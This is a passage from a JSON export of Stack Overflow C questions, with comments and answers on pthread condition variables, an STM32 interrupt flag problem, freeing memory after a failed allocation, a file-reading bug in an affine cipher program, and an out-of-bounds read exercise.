C.free(unsafe.Pointer(csLoc))\n}\n</code></pre>\n"}, {"tags": ["c", "thread-safety", "pthreads"], "comments": [{"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1524602723, "post_id": 50010445, "comment_id": 87037573, "body": "When choosing an appropriate synchronization primitive, code size and memory usage are almost never considerations. it&#39;s more about simplicity and what most naturally reflects the specific use case&#39;s nature. It&#39;s so easy to get this code wrong that the most important consideration is usually keeping the code simple enough to be &quot;obviously correct&quot;. It&#39;ll still be wrong, but that&#39;s the best you can do."}, {"owner": {"reputation": 534, "user_id": 8155816, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bJt3R.png?s=128&g=1", "display_name": "Alceste_", "link": "https://stackoverflow.com/users/8155816/alceste"}, "reply_to_user": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1524603076, "post_id": 50010445, "comment_id": 87037713, "body": "So in my case, since that&#39;s what came up naturally and I&#39;m the only one working with this code, the right answer would be <code>pthread_cond vars  are always right and have no negative aspect</code>?"}, {"owner": {"reputation": 8402, "user_id": 4664415, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hsfxj.jpg?s=128&g=1", "display_name": "mevets", "link": "https://stackoverflow.com/users/4664415/mevets"}, "edited": false, "score": 0, "creation_date": 1524606097, "post_id": 50010445, "comment_id": 87038700, "body": "Anytime you feel something is always right or always wrong, you are always wrong :)   Absolutes are the exception, the normal is let the right answer be heard."}, {"owner": {"reputation": 2315, "user_id": 4030223, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/1eoit.png?s=128&g=1", "display_name": "Erik Alap&#228;&#228;", "link": "https://stackoverflow.com/users/4030223/erik-alap%c3%a4%c3%a4"}, "edited": false, "score": 0, "creation_date": 1524635930, "post_id": 50010445, "comment_id": 87046098, "body": "Thread programming is challenging and fun, and VERY hard. Learn the basics well, and keep your code as simple as possible. Condition variables and mutexes are fundamentally different. Read manpages and examples, and use condvars as they are intended to be used! If you can, use the benefits of RAII and C++ wrappers on top of pthreads."}], "owner": {"reputation": 534, "user_id": 8155816, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bJt3R.png?s=128&g=1", "display_name": "Alceste_", "link": "https://stackoverflow.com/users/8155816/alceste"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 34, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1524602532, "creation_date": 1524602532, "question_id": 50010445, "link": "https://stackoverflow.com/questions/50010445/what-are-pthread-cond-negative-aspects-aside-from-clustering-code", "title": "What are pthread_cond negative aspects aside from clustering code", "body": "<p>sorry if the question has already been asked, I couldn't find it through the many questions concerning pthread_conds in a different way.</p>\n\n<p>As for my question, I searched my best and, although I found many post, articles and questions about the way to use pthread_cond, when to use them and their difference in contrast to semaphore, most of the people would justify the [not using of] pthread_cond like so: <code>you don't need it</code>, and I've never seen any backside of pthread_cond vars clearly stated. </p>\n\n<p>Lately, I've been told the same concerning a problem with a multiple-producers/single-consumer queue where there shouldn't be any thirst on either sides. </p>\n\n<p>I was first tempted to use pthread_cond even on the producing side, but only because they usually are pretty handy and not because of a proper thorough evaluation of the options. </p>\n\n<p>Which made me wonder: <em>Had I ended up using pthread_cond instead of simple mutexes to insert data into my queue, what would the consequences (aside from me producing some extra code) have been on my program runtime, if any? Is the difference really just about (small) change in code size and memory usage?</em>  </p>\n\n<p>Thanks, </p>\n"}, {"tags": ["c", "embedded", "stm32", "hal"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1524602071, "post_id": 50010315, "comment_id": 87037310, "body": "<code>if(GetStopFlag) break;</code> -&gt; <code>if(GetStopFlag(motor)) break;</code>"}, {"owner": {"reputation": 1, "user_id": 9692950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d5b84600d3bdc86375aac826933ec80?s=128&d=identicon&r=PG&f=1", "display_name": "FriedChicken", "link": "https://stackoverflow.com/users/9692950/friedchicken"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1524602483, "post_id": 50010315, "comment_id": 87037473, "body": "i&#39;m sorry, my bad -  i&#39;ve missed it here because I&#39;ve wrote it right now and didn&#39;t copy it from a source code, but it&#39;s a typo and doesn&#39;t solve my problem"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1524602641, "post_id": 50010315, "comment_id": 87037536, "body": "You are passing your <code>motor</code> around in some very sporadic way. Sometimes as global, sometimes as parameter. Sometimes receiving it as parameter, but then for some reason use the global. Clean this mess up first. And yeah, I believe the <code>m</code> itself should be <code>volatile</code>."}, {"owner": {"reputation": 1, "user_id": 9692950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d5b84600d3bdc86375aac826933ec80?s=128&d=identicon&r=PG&f=1", "display_name": "FriedChicken", "link": "https://stackoverflow.com/users/9692950/friedchicken"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1524603483, "post_id": 50010315, "comment_id": 87037862, "body": "The reason i&#39;m using a global Motor variable is because the exec.c file is dedicated to work with two motors. It controls the commands received from UART and execute them by calling proper motor functions. The motor.c file is a general stepper motor code operating on Motor object - it rotates it, enables it etc., and the exec.c file is managing two motors, so all of the exec.c functions have access to the global Motor objects. (and the hall sensor ISR have access to the motor object as well) I&#39;ve made a struct field <code>volatile</code> in a struct declaration, isn&#39;t it enough?"}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 1, "creation_date": 1524608676, "post_id": 50010315, "comment_id": 87039497, "body": "IMO your code is a complete mess calles a spaghetti code. If the minimal looks like this I can imagine what is in the actual one. Probalby many things change this variable (and another probably as well) simultaneously and I do no see any mechanisms used in the multi thread programs, I think that this the main reason of the @strange values@ in it."}, {"owner": {"reputation": 5703, "user_id": 1401213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccb697eb985c37893ed06f3c3324c7c8?s=128&d=identicon&r=PG&f=1", "display_name": "kkrambo", "link": "https://stackoverflow.com/users/1401213/kkrambo"}, "edited": false, "score": 0, "creation_date": 1524621028, "post_id": 50010315, "comment_id": 87042239, "body": "Does the code behave differently if you disable compiler optimizations?  Use the debugger.  Step through the disassembly.  Does the ISR use the correct address for motor?  Does the Rotate function really reread the stop flag every loop iteration?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1524657611, "post_id": 50010315, "comment_id": 87059282, "body": "Don&#39;t qualify struct members. Qualify the struct itself. And yes this is spaghetti code."}, {"owner": {"reputation": 1, "user_id": 9692950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d5b84600d3bdc86375aac826933ec80?s=128&d=identicon&r=PG&f=1", "display_name": "FriedChicken", "link": "https://stackoverflow.com/users/9692950/friedchicken"}, "edited": false, "score": 1, "creation_date": 1524755754, "post_id": 50010315, "comment_id": 87109273, "body": "I&#39;m not an advanced programmer so could somebody tell me why is it a spaghetti code? I&#39;ve got module which provides interface for motor driver. I&#39;ve got module which operates on motors the way i want it to be in my particular application, using the driver interface. I&#39;ve got module which controlls the special case of stopping the motor, accesing its field using setter. I don&#39;t get why it seems to be unreadable or error vulnerable. Actually, hall ISR is the only thing that changes this variable, and I don&#39;t think I need to manage threads because this is a simple application."}], "answers": [{"tags": [], "owner": {"reputation": 6873, "user_id": 5131711, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z5oP7.png?s=128&g=1", "display_name": "followed Monica to Codidact", "link": "https://stackoverflow.com/users/5131711/followed-monica-to-codidact"}, "is_accepted": false, "score": 1, "last_activity_date": 1524666246, "last_edit_date": 1524666246, "creation_date": 1524664329, "answer_id": 50024115, "question_id": 50010315, "link": "https://stackoverflow.com/questions/50010315/isr-cannot-change-extern-struct-field-in-c-embedded/50024115#50024115", "title": "ISR cannot change extern struct field in C embedded", "body": "<h2>The problem is somewhere else.</h2>\n\n<p><strong>It is not reproducible with the code you have provided.</strong></p>\n\n<p>I have created a minimal CubeMX project for a Discovery board with two LEDs (<code>LD3</code> on <code>PB7</code> and <code>LD4</code> on <code>PB6</code>) and a pushbutton (<code>B1</code> on <code>PA0</code>), then added your code.</p>\n\n<p><code>motor.c</code>: changed the loop to an endless one, since I don't trust myself to be able to push the button in a few microseconds, and measure the difference</p>\n\n<pre><code>void Rotate(Motor *motor)\n{\n  while(1)      // every iteration is a motor step\n  {\n    if(GetStopFlag(motor))\n        break;\n    // irrelevant code switching the output used for driver step input ----\n  }\n}\n</code></pre>\n\n<p><code>main.c</code>: Added initialization and feedback.</p>\n\n<pre><code>#include \"main.h\"\n#include \"stm32l1xx_hal.h\"\n\nvoid EXTI0_IRQHandler(void) {\n    HAL_GPIO_EXTI_IRQHandler(B1_Pin);\n}\n\nvoid EXTILine0_Config(void) {\n    GPIO_InitTypeDef GPIO_InitStructure = { 0 };\n    GPIO_InitStructure.Mode = GPIO_MODE_IT_FALLING;\n    GPIO_InitStructure.Pull = GPIO_NOPULL;\n    GPIO_InitStructure.Pin = B1_Pin;\n    HAL_GPIO_Init(B1_GPIO_Port, &amp;GPIO_InitStructure);\n    HAL_NVIC_SetPriority(EXTI0_IRQn, 3, 0);\n    HAL_NVIC_EnableIRQ(EXTI0_IRQn);\n}\n\nint main(void) {\n  HAL_Init();\n  SystemClock_Config();\n  MX_GPIO_Init();\n  EXTILine0_Config();\n  SomeFunction();\n  HAL_GPIO_WritePin(LD4_GPIO_Port, LD4_Pin, GPIO_PIN_SET);\n  while(1)\n      ;\n}\n</code></pre>\n\n<p>The rest is identical.</p>\n\n<p>Compiled it with this compiler:\n<code>arm-none-eabi-gcc (GNU Tools for Arm Embedded Processors 7-2017-q4-major) 7.2.1 20170904 (release) [ARM/embedded-7-branch revision 255204]</code> and these options: <code>-mcpu=cortex-m3 -mthumb -O3 -fmessage-length=0 -ffunction-sections -fdata-sections -flto -Wall -Wextra  -g3 -std=gnu11</code></p>\n\n<p>and it works as expected. Pressing the button triggers the EXTI interrupt, flag in the struct is set, loop stops, and LD4 lights up.</p>\n"}], "owner": {"reputation": 1, "user_id": 9692950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d5b84600d3bdc86375aac826933ec80?s=128&d=identicon&r=PG&f=1", "display_name": "FriedChicken", "link": "https://stackoverflow.com/users/9692950/friedchicken"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 137, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1524666246, "creation_date": 1524601917, "last_edit_date": 1524602549, "question_id": 50010315, "link": "https://stackoverflow.com/questions/50010315/isr-cannot-change-extern-struct-field-in-c-embedded", "title": "ISR cannot change extern struct field in C embedded", "body": "<p>I've got a problem with STM32F091RCT on Nucleo, which I use for controlling the stepper motor driver DRV8825.  </p>\n\n<p>The main goal of the code section below is to stop the stepper motor when it rotates too much, using interrupt from Hall switch and a magnet. I'm also using HAL libraries for STM32 and of course C language.</p>\n\n<p>I've got these files:</p>\n\n<p>motor.h:</p>\n\n<pre><code>typedef struct{\n   volatile uint8_t STOP_FLAG\n} Motor;\n</code></pre>\n\n<p>motor.c:  </p>\n\n<pre><code>#include \"motor.h\"\n\nvoid ClearStopFlag(Motor *motor)\n{\n  motor-&gt;STOP_FLAG = 0;\n}\n\nvoid SetStopFlag(Motor *motor)\n{\n  motor-&gt;STOP_FLAG = 1;\n}\n\nuint8_t GetStopFlag(Motor *motor)\n{\n  return motor-&gt;STOP_FLAG;\n}\n\nvoid Init(Motor *motor)\n{\n  ClearStopFlag(motor); \n}\n\nvoid Rotate(Motor *motor)\n{\n  int i;\n  for(i = 0; i &lt; 50; i++)      // every iteration is a motor step\n  {\n    if(GetStopFlag(motor)) break;\n    // irrelevant code switching the output used for driver step input ----\n  }\n}\n\nvoid Disable(Motor *motor)\n{\n  // Code that sets the GPIO pin responsible for ENABLE pin in the driver ----\n}\n</code></pre>\n\n<p>hall.c:  </p>\n\n<pre><code>#include \"motor.h\"\n#include \"exec.h\"\n\nextern Motor m;\n\nvoid HAL_GPIO_EXTI_Callback(uint16_t GPIO_Pin)\n{\n  SetStopFlag(&amp;m);\n}\n</code></pre>\n\n<p>exec.c:</p>\n\n<pre><code>#include \"hall.h\"\n#include \"motor.h\"\n\nMotor m;\n\nvoid SomeFunction(void)\n{\n  Init(&amp;m);\n  Rotate(&amp;m); // here GPIO ISR in hall.c doesn't set the STOP_FLAG while Rotate() is executing\n}\n</code></pre>\n\n<p>main.c:</p>\n\n<pre><code>#include \"exec.h\"\nint main(void)\n{\n  SomeFunction();\n  return 0;\n}\n</code></pre>\n\n<p>First of all, the original code is much more complex, I have not included here some headers which are used for function prototypes, other Motor struct fields, other functions etc. I don't have access to the code right now it is also much more cleaner that way.  </p>\n\n<p>I've tested it a lot and the problem is that the GPIO interrupt callback function cannot change the STOP_FLAG variable. This is how it behaves: </p>\n\n<ul>\n<li>the interrupt works well - when i try to turn on the diode in interrupt section - it turns on; when i try to <strong>disable the driver using Disable() function from motor.c it works and sets the proper GPIO port</strong></li>\n<li>when i try to set the STOP_FLAG in ISR whitout a function, that is using <code>m-&gt;STOP_FLAG = 1;</code> it doesn't work</li>\n<li>when i call the SetStopFlag() function from exec.c (eg. in SomeFunction() before the Rotate() line) it works properly</li>\n</ul>\n\n<p>Does somebody know why hall.c has a problem accessing the struct field?</p>\n"}, {"tags": ["c", "arrays", "memory-leaks"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1524595982, "post_id": 50008878, "comment_id": 87034383, "body": "Hmmm, perhaps <code>MAX_INT * 1000</code> overflowed?  Add <code>assert(SIZE_MAX&#47;1000 &gt;= MAX_INT);</code>.  Are you <i>sure</i> code needs that big an array.  I think you may have wanted: <code>calloc(1000, sizeof(int))</code>"}, {"owner": {"reputation": 6196, "user_id": 5822075, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1ba9afcd0c36d9685e3e1b5f2f82be2?s=128&d=identicon&r=PG&f=1", "display_name": "e0k", "link": "https://stackoverflow.com/users/5822075/e0k"}, "edited": false, "score": 0, "creation_date": 1524596480, "post_id": 50008878, "comment_id": 87034632, "body": "Why do you need to allocate <code>MAX_INT</code> items? That just seems like you&#39;re trying to break something."}, {"owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "edited": false, "score": 0, "creation_date": 1524596798, "post_id": 50008878, "comment_id": 87034797, "body": "Note that on many systems <a href=\"https://ideone.com/ObVEm6\" rel=\"nofollow noreferrer\"><code>MAX_INT*1000</code> causes an overflow</a>, so you would get undefined behavior instead of an allocation error."}, {"owner": {"reputation": 87, "user_id": 8087342, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4798bd173dead977fa9bf4c95e99f7e8?s=128&d=identicon&r=PG&f=1", "display_name": "TimeFall", "link": "https://stackoverflow.com/users/8087342/timefall"}, "reply_to_user": {"reputation": 6196, "user_id": 5822075, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1ba9afcd0c36d9685e3e1b5f2f82be2?s=128&d=identicon&r=PG&f=1", "display_name": "e0k", "link": "https://stackoverflow.com/users/5822075/e0k"}, "edited": false, "score": 0, "creation_date": 1524604058, "post_id": 50008878, "comment_id": 87038056, "body": "@e0k, I am trying to break it. I wanted the free statement to trigger so that I could test for leaks with valgrind to see if either method produced a leak."}], "answers": [{"tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": true, "score": 3, "last_activity_date": 1524596065, "creation_date": 1524596065, "answer_id": 50008959, "question_id": 50008878, "link": "https://stackoverflow.com/questions/50008878/how-to-properly-free-when-theres-an-error-allocating-memory-for-two-dimensional/50008959#50008959", "title": "How to properly free when there&#39;s an error allocating memory for two dimensional array", "body": "<p>In order to enter the branch of <code>if</code> with failed allocation <code>a[i]</code> must be set to <code>NULL</code> pointer. <a href=\"https://stackoverflow.com/q/1938735/335858\">Since passing <code>NULL</code> pointer to <code>free</code> is well-defined in the C standard</a>, including or excluding <code>a[i]</code> in the loop makes no difference.</p>\n\n<p>Both versions have the same issue, though: when the failure happens inside the outer <code>for</code> loop, you do not exit the program after clean-up, letting the allocation continue. This should be fixed by adding a call to <code>exit(EXIT_FAILURE)</code> after <code>free(a)</code>.</p>\n"}], "owner": {"reputation": 87, "user_id": 8087342, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4798bd173dead977fa9bf4c95e99f7e8?s=128&d=identicon&r=PG&f=1", "display_name": "TimeFall", "link": "https://stackoverflow.com/users/8087342/timefall"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 83, "favorite_count": 0, "accepted_answer_id": 50008959, "answer_count": 1, "score": 0, "last_activity_date": 1524596065, "creation_date": 1524595731, "question_id": 50008878, "link": "https://stackoverflow.com/questions/50008878/how-to-properly-free-when-theres-an-error-allocating-memory-for-two-dimensional", "title": "How to properly free when there&#39;s an error allocating memory for two dimensional array", "body": "<p>I encountered something odd when freeing the memory in a two dimensional array after something goes wrong. </p>\n\n<p>Case 1:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;limits.h&gt;\n\nint main(void)\n{\n    int **a = NULL;\n    int i;\n    int j;\n\n    if(!(a = calloc(5, sizeof(int *))))\n    {\n        printf(\"Error, could not allocate memory for a!\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    for(i = 0; i &lt; 5; i++)\n    {\n        if(i != 2)\n        {\n            if(!(a[i] = calloc(3, sizeof(int))))\n            {\n                printf(\"Error, could not allocate memory for a[%d]!\\n\",i);\n                for(j = 0; j &lt; i; j++)\n                {\n                    free(a[j]);\n                }\n                free(a);\n            }\n        }\n\n        else\n        {\n            if(!(a[i] = calloc(MAX_INT * 1000, sizeof(int))))\n            {\n                printf(\"Error, could not allocate memory for a[%d]\\n\", i);\n                for(j = 0; j &lt; i; j++)\n                {\n                    free(a[j]);\n                }\n                free(a);\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Case 2:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;limits.h&gt;\n\nint main(void)\n{\n    int **a = NULL;\n    int i;\n    int j;\n\n    if(!(a = calloc(5, sizeof(int *))))\n    {\n        printf(\"Error, could not allocate memory for a!\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    for(i = 0; i &lt; 5; i++)\n    {\n        if(i != 2)\n        {\n            if(!(a[i] = calloc(3, sizeof(int))))\n            {\n                printf(\"Error, could not allocate memory for a[%d]!\\n\",i);\n                for(j = 0; j &lt;= i; j++)\n                {\n                    free(a[j]);\n                }\n                free(a);\n            }\n        }\n\n        else\n        {\n            if(!(a[i] = calloc(MAX_INT * 1000, sizeof(int))))\n            {\n                printf(\"Error, could not allocate memory for a[%d]\\n\", i);\n                for(j = 0; j &lt;= i; j++)\n                {\n                    free(a[j]);\n                }\n                free(a);\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>The only difference between the two cases is that in case 1, when something goes wrong allocating memory (I deliberately have a large allocation to cause it to fail when i == 2) I loop from j = 0 to j &lt; i and in case 2 I loop from j = 0 to j &lt;= i when freeing the a[j].  Neither gives me a compiler error or warning and neither results in a problem or leak when run through valgrind, so I was just wondering which was the correct way to do it?  I thought it was case 1 because the allocation of element i failed, and so no memory is actually allocated, which means there's no need to free it, but the lack of a leak from valgrind has me second guessing myself. Thanks!</p>\n"}, {"tags": ["c", "encryption"], "comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1524600895, "post_id": 50008813, "comment_id": 87036789, "body": "You can <code>rewind</code> the file (if you don&#39;t <code>fclose</code> it)."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1524605151, "post_id": 50008813, "comment_id": 87038412, "body": "Did you just edit your question to something completely different after getting an answer to what you asked before?"}, {"owner": {"reputation": 44802, "user_id": 2752075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5oQlf.png?s=128&g=1", "display_name": "HolyBlackCat", "link": "https://stackoverflow.com/users/2752075/holyblackcat"}, "edited": false, "score": 0, "creation_date": 1524605232, "post_id": 50008813, "comment_id": 87038437, "body": "Please don&#39;t drastically change your question once it got attention. By doing that you invalidate most if not all existing comments and answers. If you got a new question, ask a new question."}], "answers": [{"tags": [], "owner": {"reputation": 6196, "user_id": 5822075, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a1ba9afcd0c36d9685e3e1b5f2f82be2?s=128&d=identicon&r=PG&f=1", "display_name": "e0k", "link": "https://stackoverflow.com/users/5822075/e0k"}, "is_accepted": false, "score": 1, "last_activity_date": 1524598460, "last_edit_date": 1524598460, "creation_date": 1524597093, "answer_id": 50009218, "question_id": 50008813, "link": "https://stackoverflow.com/questions/50008813/affine-code-errors/50009218#50009218", "title": "Affine Code Errors", "body": "<p>It always prints your <code>Text file corrupted</code> message because the file is always closed (or never open) when it gets there.</p>\n\n<p>Look what this first part does:</p>\n\n<pre><code>file = fopen(\"encr_affine.txt\", \"r\");\nif(file)\n{\n    while ((c = getc(file)) != EOF)\n        putchar(c);\n    fclose(file);\n}\n</code></pre>\n\n<p>It opens the file, then (if it's really open), it reads the <em>entire</em> file, byte by byte, then prints it all to stdout.  It then <em>closes</em> the file.</p>\n\n<p>Then you try to do stuff on a <em>closed</em> file:</p>\n\n<pre><code>fgets(str,100,file);\n</code></pre>\n\n<p>This would do nothing because the file is closed, and would return <code>NULL</code>.  If the file were never opened, it would still return <code>NULL</code> due to an error.</p>\n\n<p>But then you try it again:</p>\n\n<pre><code>if ( fgets(str,100,file) == NULL )                      \n{\n   fprintf(stderr, \"Text file corrupted\\n\");           \n   return -1;\n}\n</code></pre>\n\n<p>This <code>fgets(str,100,file)</code> <em>always</em> returns <code>NULL</code> because once again the file is closed.</p>\n\n<p>Perhaps what you really want to do is to process the bytes one at a time in your first loop before printing them with <code>putchar()</code>.</p>\n"}], "owner": {"reputation": 11, "user_id": 7356173, "user_type": "registered", "profile_image": "https://graph.facebook.com/362624710778580/picture?type=large", "display_name": "\u039d\u03af\u03ba\u03bf\u03c2 \u039a\u03bf\u03c4\u03bf\u03cd\u03c0\u03b1\u03c2", "link": "https://stackoverflow.com/users/7356173/%ce%9d%ce%af%ce%ba%ce%bf%cf%82-%ce%9a%ce%bf%cf%84%ce%bf%cf%8d%cf%80%ce%b1%cf%82"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1524605185, "creation_date": 1524595484, "last_edit_date": 1524605185, "question_id": 50008813, "link": "https://stackoverflow.com/questions/50008813/affine-code-errors", "title": "Affine Code Errors", "body": "<p>So I've been trying to experiement with some decryption algorithms and ciphers and tried to do some of them on my own. At them moment I'm writing in C an affine algorithm which I am trying to decrypt a line from a .txt file which I decrypted myself so here's where I think my problem appears since my code always pops text file corrupted and doesn't proceed to the next task.</p>\n\n<pre><code> file = fopen(\"encr_affine.txt\", \"r\");\nif(file)\n{\n    while ((c = getc(file)) != EOF)\n        putchar(c);\n    fclose(file);\n}\n\n\nfgets(str,100,file);\n\nif ( fgets(str,100,file) == NULL )                      \n{\n   fprintf(stderr, \"Text file corrupted\\n\");           \n   return -1;\n}\n</code></pre>\n\n<p>What is the mistake here? Is it reading the whole line of the txt file or just the first char? And why it doesn't proceed on into the next tasks?</p>\n\n<p>Thank you in advance</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 5, "creation_date": 1524594924, "post_id": 50008631, "comment_id": 87033804, "body": "So why do you allocate 10 but do a loop of 12?"}, {"owner": {"reputation": 35, "user_id": 7212295, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/78df7fdac93781e518fd63f9dc95aed5?s=128&d=identicon&r=PG&f=1", "display_name": "era", "link": "https://stackoverflow.com/users/7212295/era"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1524595045, "post_id": 50008631, "comment_id": 87033866, "body": "This was one of exercises during lab sessions. It asks what are potential problems in this program, like memory leakage. Why it does not give segmentation fault?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 4, "creation_date": 1524595084, "post_id": 50008631, "comment_id": 87033886, "body": "Oh, I now see you <b>deliberately</b> invoke <i>undefined behaviour</i>. No rational answer."}, {"owner": {"reputation": 5397, "user_id": 2193020, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/aa10d01a3d48851073bd61877a56b5a7?s=128&d=identicon&r=PG", "display_name": "hnefatl", "link": "https://stackoverflow.com/users/2193020/hnefatl"}, "edited": false, "score": 0, "creation_date": 1524595128, "post_id": 50008631, "comment_id": 87033903, "body": "Reading beyond the memory you&#39;ve allocated causes undefined behaviour, which means &quot;anything can happen&quot;. There&#39;s plenty of existing documentation about UB."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1524595144, "post_id": 50008631, "comment_id": 87033914, "body": "The lab or its preparational reading, should have explained. Now you should explain your understanding. <a href=\"https://meta.stackoverflow.com/questions/334822/how-do-i-ask-and-answer-homework-questions\" title=\"how do i ask and answer homework questions\">meta.stackoverflow.com/questions/334822/&hellip;</a> This still applies if the lab is over and you are not going to hand in our answers. Because in the described way you will have a much better learning experience and effect."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, 